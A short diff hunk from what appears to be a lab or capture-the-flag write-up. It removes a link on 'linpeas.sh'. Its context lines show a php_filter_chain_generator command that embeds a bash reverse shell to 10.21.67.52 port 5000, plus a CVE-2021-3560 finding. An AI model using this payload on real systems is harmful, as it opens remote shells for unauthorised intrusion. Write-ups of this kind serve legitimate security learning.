@@ -179,7 +179,7 @@ We downloaded  php_filter_chain_generator.py and chained the following to get a 
 python php_filter_chain_generator.py --chain "<?php system('bash -c \"bash -i >& /dev/tcp/10.21.67.52/5000 0>&1\"'); ?>"
 ```
 
-we downloaded [linpeas.sh](http://linpeas.sh) 
+we downloaded [linpeas.sh]
 
 ```bash
 Vulnerable to CVE-2021-3560
